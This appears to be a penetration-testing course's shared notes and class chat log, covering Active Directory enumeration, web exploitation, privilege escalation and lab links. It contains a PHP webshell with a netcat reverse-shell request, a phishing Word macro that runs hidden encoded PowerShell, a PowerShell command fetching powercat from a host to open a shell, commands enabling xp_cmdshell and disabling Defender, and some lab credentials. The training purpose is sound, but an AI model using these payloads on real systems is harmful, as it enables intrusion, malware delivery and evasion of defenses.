ldap protocol, underlying protocol for AD

389 is a ldap port that would be open

distinguished name for domain controller

book.hactricks.xyz/network-services-pentesting/pentesting-ldap

authentication required in case of accessing data

ldap search for enumeration can run without user requirement

https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

Domain admin 

/domain parameter

RSAT - remote server administration tools

https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

bloodhound

Set-MpPreference -DisableRealtimeMonitoring $true

tickets

https://tryhackme.com/room/enterprise
from Kartikey Jain to everyone:    2:50 PM
Try this AD machine. 
from Kartikey Jain to everyone:    2:55 PM
https://tryhackme.com/room/breachingad
from Kartikey Jain to everyone:    2:56 PM
Subscribed THM Users can play this AD machines
from Kartikey Jain to everyone:    2:56 PM
https://tryhackme.com/room/adenumeration


 
Machines and challenges for practice

Resources:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
https://github.com/erev0s/VAmPI
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Exploits
https://www.exploit-db.com/exploits/48296
https://medium.com/@_crac/cve-2022-33891-apache-spark-shell-command-injection-vulnerability-7c76d0e53155

CTFs
https://ringzer0ctf.com/challenges
https://tryhackme.com/room/bolt
https://tryhackme.com/room/sqlilab
http://challenges.ringzer0team.com:10075/?page=lorem.php
https://tryhackme.com/room/fileinc
https://app.hackthebox.com/machines/Inject
https://app.hackthebox.com/machines/Precious
https://tryhackme.com/room/owaspapisecuritytop105w
https://tryhackme.com/room/vulnnetactive
https://tryhackme.com/room/sudovulnssamedit
https://tryhackme.com/room/hydra
https://tryhackme.com/room/windows10privesc
https://tryhackme.com/room/linuxprivesc
https://tryhackme.com/room/linprivesc
https://tryhackme.com/room/attacktivedirectory
https://tryhackme.com/room/breachingad
https://tryhackme.com/room/adenumeration
https://tryhackme.com/room/sudovulnssamedit
https://app.hackthebox.com/machines/Precious
https://tryhackme.com/room/enterprise
==============

Getting familiar with Kali linux

introduction to bash script

understanding the target network 
-> domain  (AD)
-> subnet
-> OS 

Information gathering 
-> port scanning
-> service enum
-> web app enumeration

Intial access
-> applicable vulnerabilities
-> develop exploit

Persistence 

Privilege escalation

Lateral movement 
-> move from windows client to other windows machine like server or linux machine 


Web app attacks
Password cracking 
metasploit

Reporting

Gpo through this topic
https://medium.com/@_crac/cve-2022-33891-apache-spark-shell-command-injection-vulnerability-7c76d0e53155

nc -zv Ip Port 

/usr/share/windows-binaries -- windows specific resources.

This document provides a step-by-step guide to obtaining a reverse shell on a target machine. It covers information gathering, service enumeration, 
and uploading a webshell or reverse shell using upload.php. The document includes a one-liner webshell and a sample HTTP request for uploading the reverse shell.

reverse shell
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Exercise 1 - Obtain reverse shell on target machine
1. Information gathering on target 192.168.5.59
--> port scan using nmap
--> do a full port scan using nmap -sV -p- 192.168.5.59
--> Look for resulting open ports, you will see 8999 and 22
2. Service enumeration 
Port 22 is a standard port used for ssh
port 8999 is a custom port. look for information about port 8999; you will get http service running on it.
3. Once service is known, you will need to gather information about the page through tools like gobuster, 
dirb, dirbuster to list standard pages/directory names.
--Using a medium list, you will "upload.php" as one page.
4. Open upload.php which allows you to upload file. 
5. use upload.php to upload webshell or reverse shell. One liner webshell below
<?php echo "connected" ; system($_GET['h']);?>

Request 
GET /uploads/crack.php?h=/usr/bin/nc+-e+/bin/sh+192.168.5.58+5555 HTTP/1.1
Host: 192.168.5.59:8999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

CTFs and resources
==
https://picoctf.org/
https://www.hackthebox.com/
https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=721998175

DAY 2

https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py
https://portswigger.net/web-security/xxe
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files



Day 3

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
https://github.com/erev0s/VAmPI

https://ringzer0ctf.com/challenges

Please use these challenges for javascript based attacks under "javascript" section


https://tryhackme.com/room/bolt

https://tryhackme.com/room/sqlilab
this is the simple setup to understand LFI vulnerability - http://challenges.ringzer0team.com:10075/?page=lorem.php
https://tryhackme.com/room/fileinc


https://www.exploit-db.com/exploits/48296
3/30
https://app.hackthebox.com/machines/Inject
https://app.hackthebox.com/machines/Precious
https://tryhackme.com/room/owaspapisecuritytop105w

31 Mar


https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16

More info on xp_cmdshell()

-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO  

These are the commands to enable xp_cmdshell()

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

Payloads for MSSQL Injection

Install "HackBar, Payload Bucket" extension in Burpsuite Community version

it will create SQL payloads for you.

https://book.hacktricks.xyz/welcome/readme

for almost all techniques, attack vectors, payloads ^


MACROS --
1. Open “view macro” ms word
2. open kali web server to host this file  https://github.com/besimorhino/powercat
3. create macro with below powershell command
4. IEX(New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c  192.168.119.2 -p 4444 -e powershell


4. Use below to creat chunked string
								str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
								n = 50
								for i in range(0, len(str), n):
								 print("Str = Str + " + '"' + str[i:i+n] + '"'

4. use following VB script to obtain connection on kali machine

									Sub AutoOpen()
									 MyMacro
									End Sub
									Sub Document_Open()
									 MyMacro
									End Sub
									Sub MyMacro()
									 Dim Str As String
									 
									 Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
									 
									 CreateObject("Wscript.Shell").Run Str
									End Sub

Leveraging library-ms file and shortcut files (.lnk) -- 2 staged payload


Notes - 3/31

from AMIT to everyone:    9:36 AM
yes ma'am
from Swati to everyone:    9:48 AM
/usr/share/doc/python3-impacket/examples
from Akhil Vijayan to everyone:    10:10 AM
mam. why dont we directly use offsec' AND sleep(3) ?
from Swati to everyone:    10:13 AM
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
from Akhil Vijayan to everyone:    10:13 AM
so there is no blind sql injection in this example mam?.
from Akhil Vijayan to everyone:    10:14 AM
if the condition turned to be false, then that means, sleep didnt execute right mam?.
from Akhil Vijayan to everyone:    10:15 AM
AND IF(1=1 is the condition right mam
from Akhil Vijayan to everyone:    10:15 AM
1 = 1 is true. And for true you need to execute sleep function
from Akhil Vijayan to everyone:    10:15 AM
and post execution of sleep, the contents of offsec user details are also supposed to be printed right mam?.
from Akhil Vijayan to everyone:    10:23 AM
ok mam. so that means for first 3 seconds the results will be displayed and then post 3 seconds, once the entire query becomes false, the results disappears??
from Akhil Vijayan to everyone:    10:26 AM
yes maam
from Kartikey Jain to everyone:    10:29 AM
https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16
from Kartikey Jain to everyone:    10:29 AM
More info on xp_cmdshell()
from Kartikey Jain to everyone:    10:30 AM
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO  
from Kartikey Jain to everyone:    10:30 AM
These are the commands to enable xp_cmdshell()
from Kartikey Jain to everyone:    10:31 AM
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
from Kartikey Jain to everyone:    10:31 AM
Payloads for MSSQL Injection
from Kartikey Jain to everyone:    10:38 AM
Install "HackBar, Payload Bucket" extension in Burpsuite Community version
from Kartikey Jain to everyone:    10:38 AM
it will create SQL payloads for you.
from Swati to everyone:    10:41 AM
https://book.hacktricks.xyz/welcome/readme
from Swati to everyone:    10:42 AM
for almost all techniques, attack vectors, payloads ^
from Swati to everyone:    10:55 AM
sql, easy
https://www.vulnhub.com/entry/sunset-midnight,517/
https://www.vulnhub.com/entry/tre-1,483/
sql medium
https://www.vulnhub.com/entry/oz-1,317/
sql medium
Querier htb

from Swati to everyone:    10:56 AM
https://www.vulnhub.com/entry/sunset-midnight,517/
from AK to everyone:    10:56 AM
ok ma'am
from Kartikey Jain to everyone:    11:06 AM
https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide
from apps to everyone:    11:51 AM
still under download, request reset by vulnhub
from Akhil Vijayan to everyone:    11:53 AM
Mam, you can try checking wireshark packets to identify the IP address incase of any broadcast packets / dhcp requests are arising out of the vulnhub box.
from AK to everyone:    12:17 PM
DownloadString stores in memory, where as DownloadFile stores in filesystem? Right
from AK to everyone:    12:29 PM
Ma'am if you could share some link from where we can creat malicious macros, would be really helpful.
from Swati to everyone:    12:31 PM
https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/
from Swati to everyone:    12:32 PM
https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
from Swati to everyone:    12:33 PM
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md
from Kartikey Jain to everyone:    12:48 PM
https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology/phishing-documents
from Kartikey Jain to everyone:    12:48 PM
Resource for Phishing Macro Docs
from Swati to everyone:    12:57 PM
lunch break till 2:15 and you can try the steps for macros and library files till that time.
from Swati to everyone:    12:57 PM
steps on https://codeshare.io/oscp2023
from Kartikey Jain to everyone:    12:59 PM
https://github.com/samratashok/nishang
from Kartikey Jain to everyone:    1:00 PM
One of the best payloads in powershell for different types of bypasses
from Kartikey Jain to everyone:    1:00 PM
also contains rev shells too
from AK to everyone:    2:01 PM
Maam request if the links and info provided in the chat can also be shared in the sharecode link.
from Swati to everyone:    2:11 PM
yes we will cross-check if aything is missing there
from apps to everyone:    2:37 PM
how did you come to know what hashing algo is being used by this wordpress version?
from apps to everyone:    2:37 PM
why MD5?
from Swati to everyone:    2:41 PM
$P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/
from apps to everyone:    2:42 PM
got it. Thank you.
from apps to everyone:    2:42 PM
Also, doesnt wp salt its hashes randomly based on the config the admin does trhough wp console? So hash identifier will totally depend on whether that hash was cracked sometime in the past or not, correct?
from Akhil Vijayan to everyone:    2:43 PM
the hash created by the tool for 123456 does not have $p$ mam.
from Akhil Vijayan to everyone:    2:43 PM
i think $P$ is kind of a particular format of hash
from Akhil Vijayan to everyone:    2:44 PM
can you create a new user and give a new password just to see the type of hashes created by the system?
from Akhil Vijayan to everyone:    2:49 PM
https://tryhackme.com/resources/blog/free_path
from Akhil Vijayan to everyone:    2:49 PM
Free stuffs of tryhackme.
from Kartikey Jain to everyone:    3:07 PM
After getting the reverse shell, use these command to stablize the shell
from Kartikey Jain to everyone:    3:07 PM
https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
from Kartikey Jain to everyone:    3:11 PM
https://hashes.com/en/decrypt/hash
from Kartikey Jain to everyone:    3:12 PM
https://crackstation.net/
from Kartikey Jain to everyone:    3:12 PM
Some online hash crackers
from Kartikey Jain to everyone:    3:17 PM
https://github.com/carlospolop/PEASS-ng/releases/tag/20230326
from Akhil Vijayan to everyone:    3:19 PM
mam run the script and save it as a txt file
from Akhil Vijayan to everyone:    3:22 PM
mam, copy the linpeas script, save it as a .sh file in the target machine. run the script and save the results to another txt file
from Akhil Vijayan to everyone:    3:22 PM
do an ssh to the target machine using jose and his password
from Akhil Vijayan to everyone:    3:22 PM
that will give you a better interactive shell
from Akhil Vijayan to everyone:    3:25 PM
mam both IPs are private and you can very well get an ssh
from Akhil Vijayan to everyone:    3:25 PM
in ssh terminal you will be able to use a proper interactive shell and then use more / less commands mam to go through the linpeas script results
from Akhil Vijayan to everyone:    3:26 PM
Always mam ! ;-)
from Kartikey Jain to everyone:    3:39 PM
https://www.thegeekdiary.com/what-is-suid-sgid-and-sticky-bit/
from Kartikey Jain to everyone:    3:39 PM
What is SUID bit
from Akhil Vijayan to everyone:    3:39 PM
mam how did you change the service file? can you explain once again?
from Akhil Vijayan to everyone:    3:45 PM
But mam, are'nt we actually using ssh actively to communicate with the machine??. if so why this status command is not showing actual running ssh services or active connection?..
from Kartikey Jain to everyone:    3:48 PM
https://tryhackme.com/room/vulnnetactive
from Swati to everyone:    3:49 PM
https://tryhackme.com/room/sudovulnssamedit
from Kartikey Jain to everyone:    3:56 PM
List of all SUID binaries and related attack vectors 
from Kartikey Jain to everyone:    3:56 PM
https://gtfobins.github.io/
from Kartikey Jain to everyone:    4:22 PM
VirtualAlloc() Win32 API Doc
from Kartikey Jain to everyone:    4:22 PM
https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
from Kartikey Jain to everyone:    4:25 PM
https://antiscan.me/
from Kartikey Jain to everyone:    4:30 PM
Powershell Execution Policies
from Kartikey Jain to everyone:    4:30 PM
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3
from Kartikey Jain to everyone:    4:31 PM
Bypass ways
from Kartikey Jain to everyone:    4:31 PM
https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

4/3
from Akhil Vijayan to everyone:    9:53 AM
but mam token for asp.net websites are big alphanumeric keys which is not possible to bruteforce 
from Swati to everyone:    9:59 AM
https://tryhackme.com/room/hydra
from Swati to everyone:    10:14 AM
We will start in 5 mins
from HomelandSecurity to everyone:    10:18 AM
no audio
from Swati to everyone:    10:34 AM
https://hashcat.net/wiki/doku.php?id=rule_based_attack
from Swati to everyone:    11:01 AM
evil-winrm
from Swati to everyone:    11:03 AM
CrackMapExec ↩︎
from Swati to everyone:    11:31 AM
https://tryhackme.com/room/windows10privesc
from Akhil Vijayan to everyone:    11:40 AM
mam, if NLA is turned on, does this work?
from Akhil Vijayan to everyone:    12:08 PM
mam u can try using certutil
from Swati to everyone:    12:10 PM
https://gist.github.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0
from Swati to everyone:    12:10 PM
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
from Swati to everyone:    12:11 PM
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
from AMIT to everyone:    12:14 PM
ma'am pls paste in clipboard of the box
from Kartikey Jain to everyone:    12:47 PM
if you all are following the machine path, then it may possible that exact msfvenom payload wont work, try to change the payload and then try again.
from Kartikey Jain to everyone:    12:47 PM
You can also use powershell reverse tcp payload too
from Swati to everyone:    2:10 PM
We will start in 5 mins
from Kartikey Jain to everyone:    2:14 PM
https://tryhackme.com/room/linuxprivesc
from Kartikey Jain to everyone:    2:15 PM
https://tryhackme.com/room/linprivesc
from Kartikey Jain to everyone:    2:51 PM
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
from Kartikey Jain to everyone:    2:51 PM
This link contains all the powershell commands used in privesc (including the secure-string conversion)
from Swati to everyone:    3:11 PM
starting again in another 5 mins
from Kartikey Jain to everyone:    3:19 PM
SysInternals Tools Suite
from Kartikey Jain to everyone:    3:19 PM
https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
from Kartikey Jain to everyone:    3:19 PM
Keep these tools for privesc
from Kartikey Jain to everyone:    4:10 PM
PrintSpoofer Exploit
from Kartikey Jain to everyone:    4:10 PM
https://github.com/itm4n/PrintSpoofer
from Akhil Vijayan to everyone:    4:14 PM
mam can you do a walkthrough of an oscp lab?
from Kartikey Jain to everyone:    4:16 PM
Windows Privesc Attack Vectors
from Kartikey Jain to everyone:    4:16 PM
https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842

https://tryhackme.com/room/windows10privesc



04/05

from Swati to everyone:    11:20 AM
https://tryhackme.com/room/attacktivedirectory
from Swati to everyone:    11:23 AM
starting in 20-25 mins
from Swati to everyone:    11:30 AM
who all got oscp vouchers?
from Akhil Vijayan to everyone:    11:36 AM
Not yet received mam.
from AMIT (privately):    11:40 AM
Not yet received mam.
from AMIT to everyone:    12:19 PM
ma'am metaspolit can use one time only and sharphound is also part of metaspolit so can it cosindered for metasploit use.
from AMIT to everyone:    12:19 PM
thanks 
from rahul to everyone:    12:57 PM
Set-MpPreference -DisableRealtimeMonitoring $true
from Swati to everyone:    1:09 PM
We will start in 1 hour, at 2:15
from Swati to everyone:    1:09 PM
lunch break for now
from Swati to everyone:    2:09 PM
We will start in 5 mins
from Kartikey Jain to everyone:    2:50 PM
https://tryhackme.com/room/enterprise
from Kartikey Jain to everyone:    2:50 PM
Try this AD machine. 
from Kartikey Jain to everyone:    2:55 PM
https://tryhackme.com/room/breachingad
from Kartikey Jain to everyone:    2:56 PM
Subscribed THM Users can play this AD machines
from Kartikey Jain to everyone:    2:56 PM
https://tryhackme.com/room/adenumeration
from Kartikey Jain to everyone:    3:15 PM
https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
from Akhil Vijayan to everyone:    3:43 PM
Mam, it's written in the instructions that there may be account lockouts in case if we try bruteforce
from Akhil Vijayan to everyone:    4:02 PM
Received tryhackme voucher for one month via email. Thank you.
from Kartikey Jain to everyone:    4:03 PM
https://github.com/urbanadventurer/username-anarchy
from Kartikey Jain to everyone:    4:03 PM
Use this tool to create combinations of firstname and lastname for username enumeration

4/6
m Swati to everyone:    9:34 AM
https://app.hackthebox.com/machines/Inject
from HomelandSecurity (privately):    9:38 AM
mam , trying to reach on your number
from HomelandSecurity (privately):    9:38 AM
may i know im not able to view any screen currently 
from HomelandSecurity (privately):    9:39 AM
and if yiu have listed what all machine on tryhackme have been given 
from apps to everyone:    9:40 AM
yes
from Akhil Vijayan to everyone:    9:40 AM
yes
from AMIT to everyone:    9:40 AM
yes

https://highon.coffee/blog/lfi-cheat-sheet/
from Akhil Vijayan to everyone:    11:10 AM
mam can you show the error in browser again?
from apps to everyone:    11:36 AM
Can we not use MF since in actual exam it'll be allowed only once?
from Akhil Vijayan to everyone:    11:42 AM
mam, request if you can show a manual method, since metasploit usage is discouraged.
from Akhil Vijayan to everyone:    11:50 AM
I can find some post request formats which uses a function router method / service 
from Akhil Vijayan to everyone:    11:50 AM
But i am unable to figure out how that is used to get a reverse shell
from Akhil Vijayan to everyone:    11:50 AM
request if you can explain the same for everyone's benefit.
from Akhil Vijayan to everyone:    11:52 AM
https://github.com/cckuailong/pocsploit/blob/master/modules/vulnerabilities/springcloud/springcloud-function-spel-rce.py
from Akhil Vijayan to everyone:    1:05 PM
post downloading, how do we execute the shell from the server mam?
from Akhil Vijayan to everyone:    1:05 PM
or is it a reverseshell made using msfvenom?
from Akhil Vijayan to everyone:    1:07 PM
elf?
from Akhil Vijayan to everyone:    1:14 PM
mam what if nc is not installed in the server?
from Akhil Vijayan to everyone:    1:24 PM
ok mam 
from Akhil Vijayan to everyone:    1:24 PM
request if you can post the link of the one liner payload 
from Swati to everyone:    1:54 PM
https://exploit-notes.hdks.org/exploit/web/framework/java/spring-cloud-function-rce/
from Swati to everyone:    2:04 PM
https://app.hackthebox.com/machines/Precious
from Swati to everyone:    2:04 PM
next machine ^^
from Swati to everyone:    2:28 PM
from Swati to everyone:    2:04 PM
https://app.hackthebox.com/machines/Precious
from rahul to everyone:    3:37 PM
DocPhillovestoInject123
from Akhil Vijayan to everyone:    3:55 PM
very less
from Akhil Vijayan to everyone:    3:56 PM
now its ok ok,,
from Akhil Vijayan to everyone:    4:08 PM
can we do a ping to our own ip and then use wireshark to find if we are getting the packets from the target server or not?
from Akhil Vijayan to everyone:    4:11 PM
wireshark would be better..
from Kartikey Jain to everyone:    4:27 PM
henry:Q3c1AqGHtoI0aXAYFH
from Kartikey Jain to everyone:    4:39 PM
https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565
from Swati to everyone:    4:45 PM
try this machine for linux priv esc - https://tryhackme.com/room/sudovulnssamedit


10/4
from Akhil Vijayan to everyone:    9:32 AM
Mam, request if u can do explain "escape" . I was able to do till privilege escalation. post that i had to check online walkthrough to understand..
from Swati to everyone:    9:36 AM
sure
from Swati to everyone:    9:36 AM
let
from Swati to everyone:    9:36 AM
let's cover that*
from Akhil Vijayan to everyone:    9:47 AM
how to reach the certificate related exploit confirmation mam?.. I was not able to do anything with mimikatz and similar techniques.. since the same was a new concept, it is requested if you can confirm on how to identify to reach such vuln checks..
from Akhil Vijayan to everyone:    9:55 AM
mam, from this week, lets stay away from msfconsole so that we get a handson exp on custom / github tools..
from Akhil Vijayan to everyone:    9:55 AM
right mam..
from Swati to everyone:    9:59 AM
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
from HomelandSecurity to everyone:    10:08 AM
coudnt undrstand the last part
from Akhil Vijayan to everyone:    10:08 AM
Mam, request if you can explain the responder part once again..
from HomelandSecurity to everyone:    10:08 AM
can you pls repeat 
from Akhil Vijayan to everyone:    10:08 AM
why did we reach that dirtree option?.
from Akhil Vijayan to everyone:    10:13 AM
yes mam..
from HomelandSecurity to everyone:    10:13 AM
yes clear
from Swati to everyone:    11:10 AM
https://github.com/GhostPack/Certify
from Swati to everyone:    11:11 AM
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
from Akhil Vijayan to everyone:    11:15 AM
mam if Ryan.Cooper is part of NT Authority ground, does that mean, from this account can we get NT Authority/System privs??..
from Akhil Vijayan to everyone:    11:15 AM
group*
from Akhil Vijayan to everyone:    11:15 AM
NT Authority\Authenticated Users?..
from Akhil Vijayan to everyone:    11:16 AM
from this groups result, how do we confirm this would be a certificate related vuln?.
from HomelandSecurity to everyone:    11:16 AM
we need NT Authority\SYSTEM to have all the privs 
from HomelandSecurity to everyone:    11:17 AM
what is iwr ?
from HomelandSecurity to everyone:    11:17 AM
roger 
from Akhil Vijayan to everyone:    11:18 AM
but as per attribute, its a mandatory group and enabled by default??
from Akhil Vijayan to everyone:    11:22 AM
why is this vulnerable mam?
from Akhil Vijayan to everyone:    11:23 AM
can you explain once again?
from Akhil Vijayan to everyone:    11:23 AM
because the none of the groups are having Ryan.Cooper as the member..
from Kartikey Jain to everyone:    11:38 AM
Hello Everyone
from Kartikey Jain to everyone:    11:38 AM
Which machine is this?
from Akhil Vijayan to everyone:    11:38 AM
htb escape
from Kartikey Jain to everyone:    11:38 AM
Cool
from Akhil Vijayan to everyone:    11:40 AM
u can create the cert.pfx without giving any password mam.. it worked for me.. could'nt find any online blogs w.r.t the password usage for certificate using rubeus
from Akhil Vijayan to everyone:    11:40 AM
because in red team notes also there is no mention about to give / not to give the password.
from Akhil Vijayan to everyone:    12:04 PM
/getcredentials work mam. 
from Akhil Vijayan to everyone:    12:04 PM
but pls explain why /ptt doesnt work.
from Swati to everyone:    12:22 PM
we will discuss that by EOD 
from Swati to everyone:    12:22 PM
for the time being, please work on this https://www.vulnhub.com/entry/symfonos-1,322/
from Swati to everyone:    12:22 PM
if you have already completed the escape machine
from Swati to everyone:    1:06 PM
lunch break till 2:15
from Swati to everyone:    1:12 PM
https://blackhatinside.wordpress.com/2016/04/03/kali-linux-2-0-install-configure-samba-server-for-file-sharing/
from Swati to everyone:    2:18 PM
we will start in 5 mins
from Akhil Vijayan to everyone:    2:26 PM
screenshare not available mam.
from HomelandSecurity (privately):    2:38 PM
mam the one you showed ryt now has been covered earleir ?
from HomelandSecurity (privately):    2:39 PM
i mean the send mail utility and config.library-ms
from HomelandSecurity (privately):    2:39 PM
where exactly 
from HomelandSecurity (privately):    2:39 PM
in which lab was it covered if i may know
from HomelandSecurity (privately):    2:39 PM
understood mam 
from HomelandSecurity (privately):    2:40 PM
mam im one of the late joinees 
from HomelandSecurity (privately):    2:40 PM
 so bear with my questions sorry
from Akhil Vijayan to everyone:    2:40 PM
mam, how does the email server accepts an email from outside source without any authentication?
from HomelandSecurity (privately):    2:40 PM
 :)
from Swati to everyone:    2:59 PM
it can depend on each lab whether authenticated emails are required or unauthenticated users can also send emails to organization users
from Swati to everyone:    3:07 PM
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin
from Swati to everyone:    3:18 PM
wpscan --url <> --enumerate p,t --plugins-detection aggressive 
from HomelandSecurity to everyone:    3:19 PM
are we doing the demo now ?
from HomelandSecurity to everyone:    3:19 PM
Ash is trying to speak something i gues
from HomelandSecurity to everyone:    3:20 PM
anyone else getting the audio
from HomelandSecurity to everyone:    3:20 PM
?
from Swati to everyone:    3:42 PM
https://www.kali.org/tools/certipy-ad/
from HomelandSecurity (privately):    4:05 PM
presentor requested to terminate Ash session 
from Swati to everyone:    4:14 PM
We will cover quick walkthrough for symfonos in 10 mins. tea break
from HomelandSecurity (privately):    4:29 PM
what was the password for smbclient
from HomelandSecurity (privately):    4:29 PM
?
from HomelandSecurity to everyone:    4:30 PM
ok
from HomelandSecurity (privately):    4:49 PM
mam 
from Akhil Vijayan to everyone:    4:49 PM
mam,
from HomelandSecurity (privately):    4:49 PM
if we can execute commands directky using LFI
from Akhil Vijayan to everyone:    4:49 PM
can u pls tell what exploit did u do for the smtp for the previous machine?
from HomelandSecurity (privately):    4:49 PM
why do we need to send using php part
from Akhil Vijayan to everyone:    4:49 PM
just the methodology is enough
from HomelandSecurity (privately):    4:50 PM
i codunt get the intention behind that 
from Akhil Vijayan to everyone:    4:50 PM
i presume we already have a RDP session to the windows machine which you have used.
from Swati to everyone:    4:50 PM
https://www.exploit-db.com/exploits/40290
from Akhil Vijayan to everyone:    4:50 PM
not the current machine mam..
from HomelandSecurity (privately):    4:50 PM
ok understood 
from Akhil Vijayan to everyone:    4:51 PM
the previous one..
from Akhil Vijayan to everyone:    4:51 PM
the previous machine mam..
from Akhil Vijayan to everyone:    4:51 PM
the offsec machine
from Akhil Vijayan to everyone:    4:52 PM
can u explain the methodology
from Akhil Vijayan to everyone:    4:53 PM
the user interaction is automated or we had an rdp session mam?
from Akhil Vijayan to everyone:    4:53 PM
then what was the shortcut exploit you created mam?.
from Akhil Vijayan to everyone:    4:54 PM
but you had an rdp session right mam?. why cant we leverage this directly to compromise?..
from Akhil Vijayan to everyone:    4:55 PM
ok mam. 
from Akhil Vijayan to everyone:    4:55 PM
request if you can share the contents of the exploits created in codeshare2023

https://gtfobins.github.io/
searchsploit exploit suggester


